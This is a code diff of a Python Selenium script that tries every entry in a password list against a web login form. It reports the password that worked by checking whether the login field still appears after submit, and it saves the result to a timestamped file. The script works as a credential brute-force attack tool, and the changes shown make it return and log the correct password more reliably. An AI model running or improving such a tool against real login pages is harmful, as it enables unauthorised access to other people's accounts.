@@ -71,23 +71,27 @@ def getSubmiteDriver():
 
 
 def findPassword(driver, username_driver, username, password_drive, paswords_list, cssclick):
+    correct_password  = ""
     for password in paswords_list:
         driver.find_element(by=By.NAME, value=username_driver).send_keys(username)
         driver.find_element(by=By.NAME, value=password_drive).send_keys(password)
         driver.find_element(by=By.CSS_SELECTOR, value=cssclick).click()
         try:  # obsługa błedówtest
-            WebDriverWait(driver, 2).until(EC.presence_of_element_located((By.NAME, "uname")))
+            WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.NAME, "uname")))
         except:
             print("Correct password is ==> " + password + " <==")
-    return password
+            correct_password = password
+    return correct_password
 
 
 def writeToFile(password):
     test_date = datetime.now()
     test_date_file = datetime.now().strftime("%Y-%m-%d T %H-%M-%S")
-    file_write = open("ok_password " + str(test_date_file) + ".txt", "w")
-    file_write.write("Test date: " + str(test_date) + " \n Correct password is ==> " + password + " <==")
-
+    file_write = open("tested_password " + str(test_date_file) + ".txt", "w")
+    if password == "":
+        file_write.write("Test date: " + str(test_date) + " \n No password found")
+    else:
+        file_write.write("Test date: " + str(test_date) + " \n Correct password is ==> " + password + " <==")
 
 def main():
     url = getUrl()
@@ -109,3 +113,8 @@ def main():
     writeToFile(ok_password)
 
 main()
+
+# class CssConfig():
+#     username_css
+#     password_css
+#     submit_css
